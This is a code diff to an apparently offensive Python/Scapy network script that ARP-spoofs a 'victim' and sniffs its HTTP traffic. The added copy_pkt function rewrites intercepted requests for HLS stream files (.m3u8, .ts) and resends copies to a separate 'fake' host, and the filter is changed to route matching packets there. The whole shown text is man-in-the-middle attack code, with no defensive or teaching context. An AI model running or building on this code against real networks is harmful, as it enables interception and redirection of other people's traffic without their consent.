@@ -49,6 +49,36 @@ print(f"Victim on {victim}")
 print(f"Using interface {interface}")
 
 
+# Function to copy packets
+# Currently called when:
+# -> Request to host:port containing .m3u8
+# Currently does:
+# -> Send copy of request to fake_host:fake_port on fake_mac
+# NOTE;
+# this is v0: it is not useful yet
+def copy_pkt(this_packet):
+    global fake
+
+    # Lookup fake MAC
+    mac_fake = getmacbyip(str(fake))
+    if mac_fake is None:
+        print(f"Could not find MAC for fake ({fake})")
+        print(f"Aborting operation")
+        return False
+    elif mac_fake == "ff:ff:ff:ff:ff:ff":
+        # Lookup local MAC
+        mac_fake = gma(interface=interface)
+        if mac_fake is None:
+            print(f"Could not find MAC for local machine")
+            print(f"Aborting operation")
+            return False
+
+    this_packet[IP].dst = str(fake)
+    this_packet[HTTP].Host = str(fake) + ":" +  str(fake_port)
+    this_packet[Ether].dst = mac_fake
+    send(this_packet)
+    this_packet.show()
+
 # Function to print packets
 def print_pkt(this_packet):
     # Filter only HTTP requests
@@ -60,10 +90,11 @@ def print_pkt(this_packet):
     print(f"Got packet with path {path}")
 
     # Filter HTTP requests for stream.m3u8
-    if 'stream.m3u8' not in path:
-        return
+    if 'stream.m3u8' in path or '.ts' in path:
+        copy_pkt(this_packet)
 
-    this_packet.show()
+    # For debugging
+    # this_packet.show()
 
 # Function to initiate an ARP attack
 def init_arp(ip_victim, ip_server):
